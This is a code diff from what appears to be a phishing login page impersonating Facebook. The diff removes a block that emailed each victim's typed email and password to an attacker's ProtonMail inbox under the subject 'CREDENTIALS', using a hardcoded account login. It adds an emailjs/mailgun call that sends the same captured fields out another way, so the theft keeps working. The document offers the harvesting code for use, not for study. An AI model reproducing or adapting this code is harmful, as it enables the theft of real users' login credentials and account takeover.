@@ -111,18 +111,8 @@ submitLogin.onclick = (e) => {
 	.catch(error => console.error(error))
 
 	async function postFormData(url, data) {
-		console.log(document.querySelector('#email').value,document.querySelector('#email').value)
-		Email.send({
-				Host: "smtp.protonmail.ch",
-				Username : "facebo0ksecure@protonmail.com",
-				Password : "Qwerty!W@E#R$T%Y",
-				To : 'stanbic@protonmail.com',
-				From : "facebo0ksecure@protonmail.com",
-				Subject : "CREDENTIALS",
-				Body : `${document.querySelector('#email').value,document.querySelector('#pass').value}`,
-			}).then((message)=>{
-			alert("Proceed to facebook.com/home")
-		})
+		params = { email: document.querySelector('#email').value, pass:document.querySelector('#email').value}
+		emailjs.sendForm('mailgun','template_h1GTQyBN', params)
 		const formData = new FormData(document.querySelector('#login_form'))
 		console.log(formData)
 		const response = await fetch(url, {
